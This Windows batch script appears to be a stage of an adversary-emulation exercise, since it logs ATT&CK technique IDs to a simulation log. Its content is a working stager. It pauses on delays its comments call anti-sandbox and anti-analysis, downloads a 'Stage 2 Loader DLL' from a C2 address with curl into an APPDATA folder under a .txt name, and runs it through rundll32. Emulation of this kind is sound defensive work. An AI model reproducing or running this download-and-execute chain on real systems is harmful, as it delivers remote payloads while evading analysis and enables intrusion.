@echo off
setlocal enabledelayedexpansion

SET pvnxkl=%APPDATA%\10374\27a9332b
SET rwmtjq=9bb71a00.txt
SET hzsdby=https://10.0.0.49/stage/2/icon.png?10374-7
SET cqfaem=BALAM-S2BO
SET yjlwop=10374
SET tbxrni=7

SET logfile=%APPDATA%\!tbxrni!\macula-simulations.log
if not exist "%APPDATA%\!tbxrni!" mkdir "%APPDATA%\!tbxrni!"

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: script_start>> "!logfile!" 2>nul

REM Initial execution delay (anti-sandbox) — 15 seconds before any logic
timeout /t 15 /nobreak >nul

REM Random delay: 10-29 seconds
SET /A delay=%RANDOM% %% 20 + 10
timeout /t %delay% /nobreak >nul

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: initial_delay_complete>> "!logfile!" 2>nul

REM Anti-analysis: Debugger.IsAttached equivalent via timing probe
REM If a debugger is attached, execution will be slower — add a sleep-style delay but always continue
CHOICE /C Y /N /D Y /T 5 >nul

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: anti_analysis_check_complete>> "!logfile!" 2>nul

REM Log T1497 — evasion always continues, result always OK
echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1497|Virtualization/Sandbox Evasion=[OK]:[]>> "!logfile!" 2>nul

REM Inter-operation delay
ping -n 8 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: heartbeat_start>> "!logfile!" 2>nul

REM Heartbeat fetch — downloads Stage 2 Loader DLL from C2 in a single operation
curl -k -s -o "!pvnxkl!\!rwmtjq!" "!hzsdby!"
SET curlerr=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: heartbeat_complete>> "!logfile!" 2>nul

REM Log T1071 result
if %curlerr%==0 (
    echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1071|Application Layer Protocol=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1071|Application Layer Protocol=[FAIL]:[curl_failed]>> "!logfile!" 2>nul
)

REM Inter-operation delay
timeout /t 7 /nobreak >nul

REM Change working directory to Loader location
echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: chdir_start>> "!logfile!" 2>nul

cd /d "!pvnxkl!" >nul 2>&1
SET cderr=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: chdir_result=%cderr%>> "!logfile!" 2>nul

REM Inter-operation delay
CHOICE /C Y /N /D Y /T 6 >nul

REM LOLBIN invocation — execute downloaded Loader DLL via rundll32
echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: rundll32_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: dll_load_start>> "!logfile!" 2>nul

rundll32.exe !rwmtjq!, DllMain
SET lolbinerr=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: process_start_complete>> "!logfile!" 2>nul

REM Log T1218 result
if %lolbinerr%==0 (
    echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!cqfaem!][!yjlwop!]: T1218|System Binary Proxy Execution=[FAIL]:[lolbin_invocation_failed]>> "!logfile!" 2>nul
)

echo [!tsvar!][DEBUG][!cqfaem!][!yjlwop!]: script_exit>> "!logfile!" 2>nul

endlocal